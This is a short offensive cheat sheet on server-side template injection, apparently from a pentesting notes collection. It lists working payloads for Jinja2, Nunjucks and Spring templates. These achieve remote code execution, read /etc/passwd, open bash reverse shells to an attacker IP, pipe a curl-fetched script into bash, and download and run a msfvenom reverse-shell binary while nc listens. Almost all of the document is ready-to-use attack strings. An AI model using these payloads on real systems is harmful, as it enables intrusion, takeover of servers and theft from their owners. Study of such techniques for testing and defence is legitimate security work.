## Definition
A __SSTI__ is an attack where the hacker is able to gain remote code execution in the victim's system just by using native template syntax to inject a malicious payload into a template, which is then executed server-side

## When to try this attack
Some occasions could be:
- When the server has [Python in Servers](<General Info/Tecnologias Web/Python in Servers.md>) installed
- When the webserver is [Flask](<General Info/Tecnologias Web/Flask.md>)

## Ways to exploit different templates
Jinja2:
- Allows remote code execution: `{{ self._TemplateReference__context.cycler.\_\_init\_\_.\_\_globals\_\_.os.popen('id').read() }}`
- In order to send a reverse shell you can run: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.9/443 0>&1"').read() }}`
Nunjucks (NodeJS):
- The way to exploit and get RCE is: `{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}`
- For the reverse-shell is: `{{range.constructor("return global.process.mainModule.require('child_process').execSync('curl {YOUR-IP}:{PYTHON-PORT}/{REV-SHELL-FILE} | bash')")()}}` - Meanwhile, you've to be serving a basic reverse-shell bash TCP in your python server, this can be done running: python -m http.server 80 - in the folder that has the file
SpringFramework (Java):
- Way to exploit: `${T(java.lang.Runtime).getRuntime().exec('{BASH-COMMAND}')}` or `*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("{BASH-COMMAND}")}`
- For a reverse-shell: `*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("{BASH-COMMAND}")}` or, another useful way could be:
	- Create a reverse-shell with msfvenom `msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} LPORT=443 -f elf > r.elf`
	- Start a python http server with `python -m http.server 80`
	- Download the file via SSTI `*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://{IP}/r.elf")}`
	- Give the file execute permisson ``*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./r.elf")}``
	- Execute the file while listening in the port 443 ``*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./r.elf")}`` meanwhile `nc -lvnp 443`
